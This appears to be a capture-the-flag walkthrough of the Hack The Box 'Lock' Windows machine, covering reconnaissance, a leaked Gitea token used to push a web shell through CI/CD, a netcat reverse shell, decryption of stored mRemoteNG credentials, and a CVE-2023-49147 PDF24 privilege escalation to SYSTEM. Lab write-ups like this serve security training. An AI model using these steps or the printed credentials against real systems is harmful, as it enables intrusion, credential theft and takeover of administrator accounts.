<img width="1400" height="1138" alt="Lock" src="https://github.com/user-attachments/assets/23c5f260-e324-4428-8596-4c3729caf758" />

## Reconnaissance

```bash
└─$ sudo nmap -sCV  10.129.234.64 -p- --min-rate=1000 -oN nmap_long                                                                                                                                                                                                           
[sudo] password for kali:                                                                                                                                                                                                                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:19 EDT                                                                                                                                                                                                               
Nmap scan report for 10.129.234.64                                                                                                                                                                                                                                            
Host is up (0.025s latency).                                                                                                                                                                                                                                                  
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index             
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                                                                                      
| http-methods:                                                                                                                        
|_  Potentially risky methods: TRACE                                                                                                   
445/tcp  open  microsoft-ds?                                                                                                           
3000/tcp open  http          Golang net/http server                                                                                    
|_http-title: Gitea: Git with a cup of tea                                                                                             
| fingerprint-strings:                                                                                                                 
|   GenericLines, Help, RTSPRequest:                                                                                                   
|     HTTP/1.1 400 Bad Request                                                                                                         
|     Content-Type: text/plain; charset=utf-8                                                                                          
|     Connection: close                                                                                                                
|     Request                                                                                                                          
|   GetRequest:                                                                                                                        
|     HTTP/1.0 200 OK                                                                                                                  
|     Cache-Control: max-age=0, private, must-revalidate, no-transform    
|     Content-Type: text/html; charset=utf-8                                                                                           
|     Set-Cookie: i_like_gitea=05d5a4e00f118f0c; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=8KFIaVpcq7d6hsm1ZZvy28Arr-c6MTc1NjAyNzMwMzc5NzgxMzgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN                                                                                                      
|     Date: Sun, 24 Aug 2025 09:21:44 GMT                                                                                              
|     <!DOCTYPE html>                                                                                                                  
|     <html lang="en-US" class="theme-auto">                                                                                           
|     <head>                                                                                                                           
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>                                                                                      
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMw
MDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU   
|   HTTPOptions:                                                                                                                       
|     HTTP/1.0 405 Method Not Allowed                                                                                                  
|     Allow: HEAD                                                                                                                      
|     Allow: HEAD                                                                                                                      
|     Allow: GET          
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=d84c8b15341cd86e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=WCEKR5EY1aPyfDegRMD_jYdFgTA6MTc1NjAyNzMwNDQ3NjE0MzcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 24 Aug 2025 09:21:44 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-24T09:22:46+00:00; +2s from scanner time.                                                                                                                                                                                                                
| rdp-ntlm-info:                                                                                                                                                                                                                                                             
|   Target_Name: LOCK                                                                                                                                                                                                                                                        
|   NetBIOS_Domain_Name: LOCK                                                                                                                                                                                                                                                
|   NetBIOS_Computer_Name: LOCK                                                                                                                                                                                                                                              
|   DNS_Domain_Name: Lock                                                                                                                                                                                                                                                    
|   DNS_Computer_Name: Lock                                                                                                                                                                                                                                                  
|   Product_Version: 10.0.20348
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                         
Nmap done: 1 IP address (1 host up) scanned in 193.75 seconds  
```
Based on the Nmap scan results, we can guess it’s a Windows machine.

On port 80 there isn’t much to do, as the page looks static.

On port 3000 we see Gitea, which is a self-hosted Git service.

<img width="3576" height="1551" alt="2025-08-24 112638" src="https://github.com/user-attachments/assets/f3397748-676c-4356-b22e-d6bd9ee612d4" />

Inside we find a repo from ellen.freeman with a Python script:

```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main(()
```
We find an API endpoint, and looking at the repo history we find a personal access token.

<img width="3086" height="1089" alt="2025-08-24 113013" src="https://github.com/user-attachments/assets/3d13cecd-e20b-427d-95b8-93fb0aaa5dd9" />

I will copy the script with the personal access token in it and run it on my local Kali machine.

```bash
└─$ python3 repos.py http://10.129.234.64:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```
Running the script, we discover a new repository /website which is set to private and we can’t git clone it or view it on the webpage. But since we have the personal token, we can use it to clone the repo.

```bash
└─$ git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.70 MiB/s, done.
Resolving deltas: 100% (35/35), done.

```
And we have copied the repository to our Kali machine.

## Foothold

I didn’t find any interesting files, so I will check earlier commits.
```bash
└─$ git log --oneline --graph                                                                                           
* 73cdcc1 (HEAD -> main, origin/main, origin/HEAD) update
* 7650fa6 update
* 657a342 update
* 15ee839 update
* 0beaffb init
```
At /website/readme.md we find an interesting notice

```bash
└─$ cat readme.md      
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```
That means I can create a web shell and push it, and it will be deployed.

I will grab the web shell from https://raw.githubusercontent.com/grov/webshell/refs/heads/master/webshell-LT.aspx and commit it.

```bash
┌──(kali㉿kali)-[~/…/htb/lock/files/website]
└─$ git add webshell.aspx 

┌──(kali㉿kali)-[~/…/htb/lock/files/website]
└─$ git commit -m "test" 
[main 9066b85] test
 1 file changed, 161 insertions(+)
 create mode 100644 webshell.aspx

```
```bash
└─$ git push            
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 3 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 2.08 KiB | 2.08 MiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.234.64:3000/ellen.freeman/website.git
   edc1e8c..9066b85  main -> main
```
Now, visiting the website /webshell.aspx on port 80, we get a web shell.

<img width="3800" height="1058" alt="2025-08-24 144017" src="https://github.com/user-attachments/assets/b90dc510-90f9-4ca2-8bdb-7fa0c6bbf70c" />

Let’s get a reverse shell with a Base64-encoded PowerShell script.

After sending it, we get a connection back!

```bash
└─$ rlwrap nc -lvnp 9001                           
listening on [any] 9001 ...
connect to [10.10.14.67] from (UNKNOWN) [10.129.234.64] 51969
whoami
lock\ellen.freeman
PS C:\inetpub\wwwroot> 
```
In the home directory I find credentials for ellen.freeman

```powershell
PS C:\Users\ellen.freeman> cat .git-credentials
http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
```
But those are valid only for the Gitea webpage

Enumerating the home directory, I find config.xml:

```bash
    Directory: C:\Users\ellen.freeman\.ssh


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        12/27/2023  11:11 AM              0 authorized_keys                                                      


    Directory: C:\Users\ellen.freeman\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        12/28/2023   5:59 AM           3341 config.xml                                                           


    Directory: C:\Users\ellen.freeman\Favorites


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---        12/28/2023   5:58 AM                Links                                                                
-a----        12/28/2023   5:58 AM            208 Bing.url                                                             


    Directory: C:\Users\ellen.freeman\Links


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        12/28/2023   5:58 AM            518 Desktop.lnk                                                          
-a----        12/28/2023   5:58 AM            979 Downloads.lnk                                                        


PS C:\Users\ellen.freeman> 
```
Inside the config file we find an encrypted password for Gale.Dekarios

```powershell
PS C:\Users\ellen.freeman\Documents> cat config.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP"
----<SNIP>----
```
Searching for a way to decrypt mRemoteNG passwords, I found this GitHub repository:
https://github.com/gquere/mRemoteNG_password_decrypt

We just need to pass the config file to decrypt the password.

```bash
└─$ python3 mremoteng_decrypt.py config.xml 
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```
Finally, we can RDP to Lock and grab the user flag

<img width="1788" height="1398" alt="2025-08-24 151046" src="https://github.com/user-attachments/assets/d06a313f-8571-47a2-82b4-c350c00b406b" />

## Privilege Escalation
I noticed PDF24 Creator installed; checking the version, it’s 11.15.1.

<img width="1686" height="833" alt="2025-08-24 155201" src="https://github.com/user-attachments/assets/09461fb8-adbe-4438-978e-1c404042cfd9" />

Searching online for vulnerabilities, we come across CVE-2023-49147:
>An issue was discovered in PDF24 Creator 11.14.0. The configuration of the MSI installer file was found to produce a visible cmd.exe window when using the repair function of msiexec.exe. This allows an unprivileged local attacker to use a chain of actions (e.g., an oplock on faxPrnInst.log) to open a SYSTEM cmd.exe.

To reproduce the steps, I found an article on SEC Consult with a PoC.
First we need to start the repair of PDF24 Creator and trigger the vulnerable actions without a UAC popup, but for that we need an .msi installation file. Unfortunately it’s not in the PDF24 directory, but running dir -force in the root of the C drive I find a hidden installer directory.

<img width="1452" height="793" alt="2025-08-24 155748" src="https://github.com/user-attachments/assets/5c0719a8-7efe-435e-9aad-f965e8c37e6e" />

Inside there is an .msi installation file, which we need.

Next step would be to grab SetOpLock.exe from this GitHub repository:
https://github.com/googleprojectzero/symboliclink-testing-tools

After downloading the file from GitHub I will extract it and start a web server so I can later download it from the victim machine.

```bash
└─$ 7z x Release.7z 


└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
<img width="2511" height="243" alt="2025-08-24 160304" src="https://github.com/user-attachments/assets/2032cd88-ceb5-4ed5-ace4-5a9adda00412" />

First we run OpLock.

<img width="1679" height="303" alt="2025-08-24 160625" src="https://github.com/user-attachments/assets/4e94a27a-181e-4a89-bb3e-6003db87338b" />

Now I will run the pdf-creator.msi file and press Repair.

<img width="864" height="663" alt="2025-08-24 160813" src="https://github.com/user-attachments/assets/df68ab14-fd0b-4529-91ba-1d1fa7a83629" />

After running it, at the end we see a pdf24-PrinterInstall.exe window which just hangs:

<img width="1586" height="879" alt="2025-08-24 161015" src="https://github.com/user-attachments/assets/808e0965-dc98-4386-80c6-64f9b45e3b11" />

To get a SYSTEM shell from here we need to do the following:

1. Right-click on the top bar of the cmd window.

2. Click on Properties.

3. Under Options, click on the Legacy console mode link.

4. Open the link with a browser other than Internet Explorer or Edge (both don’t open as SYSTEM on Win11).

5. In the opened browser window, press Ctrl+O.

6. Type cmd.exe in the top bar and press Enter.

After doing all those steps, I download and launched cmd.exe as SYSTEM.

<img width="1112" height="552" alt="2025-08-24 161252" src="https://github.com/user-attachments/assets/a9d4b947-6eb2-4f45-b75e-0642aba105b4" />

Now I will just change the Administrator password with net user command

```cmd
net user Administrator password123!
```
And log in with xfreerdp3 using the new password.

<img width="3068" height="1368" alt="2025-08-24 161430" src="https://github.com/user-attachments/assets/55d576d1-f114-4fde-9434-b9ee44be46af" />

Grab the root flag and we are done!
